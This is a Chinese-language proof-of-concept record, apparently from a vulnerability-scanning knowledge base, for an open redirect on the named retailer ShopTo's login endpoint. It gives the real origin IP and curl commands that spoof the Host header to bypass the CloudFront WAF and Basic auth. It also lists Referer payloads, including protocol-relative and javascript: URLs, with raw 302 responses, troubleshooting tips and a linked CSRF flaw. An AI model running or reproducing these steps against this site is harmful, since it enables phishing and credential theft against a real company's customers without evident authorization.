# ShopTo 源站 dcshop /en/login/?action=shop_login 登录失败 302 Location 完全跟随 Referer 头（开放重定向 CWE-601，接受外部域/协议相对/javascript:）

- **code**: shopto-origin-dcshop-login-open-redirect-referer
- **kind**: poc
- **category**: auth-bypass
- **component**: DcCMS 2015 / dcshop storefront（登录处理端点 /en/login/?action=shop_login，源站 nginx 多 vhost）
- **severity**: medium
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: 2026-11-11 15:33 GMT，ARTEX 执行机（Windows）curl 8.x 直连 shopto.net 源站 3.8.196.174:443（Host: localhost 绕过 CloudFront WAF 与 dev Basic，--http1.0）。finding#89 / verdict=verified。核心证据：POST /en/login/?action=shop_login 携带 Referer: https://a.evil/1 且密码错误 → 原始 302 报文 Location: https://a.evil/1?login_error=true；变体对照 Location 与 Referer 一一对应（含 query/fragment），接受 //evil.tld 与 javascript:alert(1)；去掉 Referer 或改用 X-Forwarded-Host 时 Location 恒为相对 ?login_error=true，确证反射点就是 Referer 且无白名单。故判定为开放重定向。
- **path**: pocs/shopto-origin-dcshop-login-open-redirect-referer/poc.md
- **tags**: open-redirect,cwe-601,dcshop,dccms,login,referer,302,shopto,php
- **created_at**: 2026-11-11T15:39:39.718Z
- **engine**: https://3.8.196.174（shopto.net 源站 dcshop；生产 www.shopto.net 同代码路径）
- **found_by**: vuln-scan

## 描述

ShopTo 源站 dcshop 登录处理端点 /en/login/?action=shop_login 在登录失败时，把验证者完全可控的 Referer 头原样写入 302 响应的 Location（追加 login_error=true），无域名/协议白名单：外部域、协议相对 URL（//evil.tld）、甚至 javascript: 伪协议都被照写。构成 CWE-601 开放重定向，可用于钓鱼跳转 / 可信域外带。前提是能直连源站（Host 头设为非 *.shopto.net 绕过 CloudFront WAF 与 dev/staging 的 HTTP Basic）。

## 用法

```
前置：能访问源站 IP:443（本例 3.8.196.174，公网直达无 CDN），curl 加 -k，建议 --http1.0；请求头 Host 必须设为非 *.shopto.net（如 localhost）以绕过 CloudFront WAF 与 dev 的 HTTP Basic；无需任何认证或 cookie。

【判定要点】只看 302 响应头里 Location 是否随 Referer 一一对应变化（含 query/fragment），不要跟随跳转（不要 -L，看原始报文）。

【1) 最小复现（登录失败即触发，密码随便错）】
curl -sk --http1.0 -H "Host: localhost" -H "Referer: https://a.evil/1" \
  -X POST --data "action=shop_login&input_email=x@x.com&input_password=y&storefront_token=" \
  "https://3.8.196.174/en/login/?action=shop_login" -D - -o /dev/null
期望回显：
  HTTP/1.0 302 Found
  Location: https://a.evil/1?login_error=true
  Set-Cookie: login_used_data=x%40x.com; Max-Age=2; path=/; secure; HttpOnly

【2) 变体对照（同一请求，只改 Referer，全部命中）】
  Referer: https://b.evil/2?x=y   → Location: https://b.evil/2?x=y&login_error=true
  Referer: https://c.evil/3#frag  → Location: https://c.evil/3#frag?login_error=true
  Referer: //evil.tld             → Location: //evil.tld?login_error=true   （协议相对，浏览器按当前 scheme 跳到 evil.tld）
  Referer: javascript:alert(1)    → Location: javascript:alert(1)?login_error=true  （证明是原始反射、非安全重定向）
  无 Referer                      → Location: ?login_error=true

【3) 排除干扰项（确证反射点就是 Referer）】
  去掉 Referer；另测 X-Forwarded-Host: evil.tld → Location 仍为相对 ?login_error=true，说明不是 Host/X-Forwarded-Host 驱动。

【生产入口】https://www.shopto.net/en/login/?action=shop_login 走同一代码路径（经 CloudFront 时 Host 校验会拦伪造，需直连源站验证）。

【失败常见原因】
- 走 CloudFront 边缘而非源站 → 伪造 Host 被 403/拦截；必须直连源站 IP。
- 用 HTTP/1.1 打单个路径可能 empty reply → 加 --http1.0。
- 目标中间层（WAF/反代）改写或丢弃 Location → 判据不成立，需换路径或放弃。
- 无 Referer 或 Referer 已被前置清洗 → Location 退化为相对路径，不成立。

【证伪条件】真实浏览器提交该跨站表单时落点恒为 shopto 自身域（Location 被中间层改写），或 Location 不再随任意 Referer 变化，则结论不成立。当前 curl 直连抓取的原始 302 报文已证 Location 随 Referer 变化。

【辅助发现】同一端点登录流程无服务端 CSRF 校验：跨站 Origin/Referer + 空/错 storefront_token 仍被正常处理（见 kb#545 shopto-origin-dcshop-storefront-csrf-no-token-get-trigger）。
```

## 正文

```
# ShopTo 源站 dcshop 登录失败开放重定向（Location 跟随 Referer 头）

## 指纹 / 命中条件
- 组件：DcCMS 2015 / dcshop storefront，登录端点 `POST /en/login/?action=shop_login`
- 触发：任意一次登录失败（密码错即可），302 的 Location = 请求的 Referer 头 + `?login_error=true`
- 无白名单：外部域 / 协议相对 `//host` / `javascript:` 伪协议全部照写

## 原始复现报文（curl 直连源站，2026-11-11 15:33 GMT，ARTEX 执行机 curl 8.x）

### ① 基线（外部域）
```
POST /en/login/?action=shop_login HTTP/1.0
Host: localhost
Referer: https://evil.tld/x.html
Content-Type: application/x-www-form-urlencoded

action=shop_login&input_email=any@x.com&input_password=wrong&storefront_token=
```
回显：
```
HTTP/1.0 302 Found
Location: https://evil.tld/x.html?login_error=true
Set-Cookie: login_used_data=any%40x.com; Max-Age=2; path=/; secure; HttpOnly
```

### ② javascript: 伪协议（证明原始反射）
同上，`Referer: javascript:alert(1)`
```
HTTP/1.0 302 Found
Location: javascript:alert(1)?login_error=true
```

### ③ 协议相对 URL
同上，`Referer: //evil.tld`
```
HTTP/1.0 302 Found
Location: //evil.tld?login_error=true
```

### ④ 排除 Host/X-Forwarded-Host 驱动
去掉 Referer；另测 `X-Forwarded-Host: evil.tld` → 两次均 `Location: ?login_error=true`

### 变体对照（Location 与 Referer 一一对应，含 query/fragment）
| Referer | Location |
|---|---|
| https://a.evil/1 | https://a.evil/1?login_error=true |
| https://b.evil/2?x=y | https://b.evil/2?x=y&login_error=true |
| https://c.evil/3#frag | https://c.evil/3#frag?login_error=true |
| //evil.tld | //evil.tld?login_error=true |
| javascript:alert(1) | javascript:alert(1)?login_error=true |
| （无） | ?login_error=true |

## 一键验证命令
```bash
curl -sk --http1.0 -H "Host: localhost" -H "Referer: https://a.evil/1" \
  -X POST --data "action=shop_login&input_email=x@x.com&input_password=y&storefront_token=" \
  "https://3.8.196.174/en/login/?action=shop_login" -D - -o /dev/null
```

## 影响
- CWE-601 开放重定向：从 shopto 可信域 302 到攻击者站点，用于钓鱼、OAuth/凭据窃取前置、可信域外带。
- 接受 `javascript:` 说明取值为原始反射、无任何 scheme 校验。

```
